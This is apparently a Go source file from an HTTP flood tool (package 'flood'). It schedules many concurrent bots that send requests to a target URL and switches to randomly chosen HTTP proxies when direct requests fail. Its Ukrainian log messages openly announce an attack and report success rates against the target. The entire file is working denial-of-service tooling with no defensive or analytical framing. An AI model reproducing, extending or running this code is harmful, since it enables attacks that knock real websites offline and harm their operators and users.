package flood

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	log "github.com/sirupsen/logrus"
)

type BotScheduler struct {
	target      Target
	proxies     []Proxy
	onlyProxy   bool
	botsNum     int
	maxErrCount int
	activeBots  int64
}

func NewBotScheduler(target Target, proxies []Proxy, botsNum, maxErrCount int, onlyProxy bool) *BotScheduler {
	if onlyProxy && len(proxies) == 0 {
		panic("no proxy for attack")
	}

	return &BotScheduler{
		target:      target,
		proxies:     proxies,
		onlyProxy:   onlyProxy,
		botsNum:     botsNum,
		maxErrCount: maxErrCount,
	}
}

func (b *BotScheduler) Start(rootCtx context.Context) error {
	withProxy := true
	getProxy := func() *Proxy {
		if withProxy && len(b.proxies) > 0 {
			return &b.proxies[rand.Intn(len(b.proxies))]
		}

		return nil
	}

	if !b.onlyProxy {
		ctxTimeout, cancel := context.WithTimeout(rootCtx, time.Second*5)
		defer cancel()

		req, err := newReq(ctxTimeout, "GET", b.target.URL)
		if err != nil {
			return fmt.Errorf("on creaing a request: %w", err)
		}

		resp, err := DefClient.Do(req)
		if err != nil {
			log.Warnf("Надсилаючи запит без проксі: %v\n", err)
		} else {
			toDevNull(resp.Body)
		}

		if (err != nil || resp.StatusCode != http.StatusOK) && len(b.proxies) > 0 {
			log.Infoln("Починаємо атаку через HTTP проксі :)")
		} else {
			withProxy = false
		}
	}

	msgs := make(chan BotResp, b.botsNum)
	var wg sync.WaitGroup
	wg.Add(b.botsNum)

	// TODO: handle errors && and  statisics
	for i := 0; i < b.botsNum; i++ {
		select {
		case <-rootCtx.Done():
			return nil
		default:
			go func() {
				defer wg.Done()

				id := rand.Int() // TODO: possible collisions
				log := log.WithField("bot", id)

				c, err := NewBot(id, getProxy)
				if err != nil {
					log.Infof("Під час створення бота: %v\n", err)
					return
				}

				atomic.AddInt64(&b.activeBots, 1)
				c.Start(rootCtx, b.target.URL, msgs)
			}()
		}
	}

	botCtx, cancel := context.WithCancel(rootCtx)
	go func() {
		wg.Wait()
		cancel()
	}()

	b.botResponseHandler(botCtx, msgs)

	return nil
}

func (b *BotScheduler) botResponseHandler(botCtx context.Context, msgs <-chan BotResp) {
	logActiveBots := func() {
		log.Infof("Ціль '%s'; активних ботів: %d/%d",
			b.target.URL,
			atomic.LoadInt64(&b.activeBots),
			b.botsNum,
		)
	}

	totalRequstSent, successRequestSent := 0, 0
	for {
		select {
		case <-botCtx.Done():
			return
		default:
		}

		select {
		case <-botCtx.Done():
			return
		case msg := <-msgs:
			totalRequstSent++
			if msg.Err != nil {
				log.WithField("id", msg.ID).Errorln(msg.Err)
			} else {
				log.WithField("id", msg.ID).Infof("[200] %s", b.target.URL)
				successRequestSent++
			}

			if totalRequstSent%100 == 0 {
				logActiveBots()
				log.Infof("Успішних запитів: %d/%d\n", successRequestSent, totalRequstSent)
			}

			keepBot := true
			if msg.ErrCount > b.maxErrCount {
				keepBot = false
				atomic.AddInt64(&b.activeBots, -1)
				log.WithField("id", msg.ID).Warnf(
					"Бот закінчив роботу; к-сть помилок для одного бота перевищила ліміт %d невдалих запитів",
					b.maxErrCount,
				)
				logActiveBots()
			}

			select {
			case <-botCtx.Done():
			case msg.Continue <- keepBot:
			}
		}
	}
}
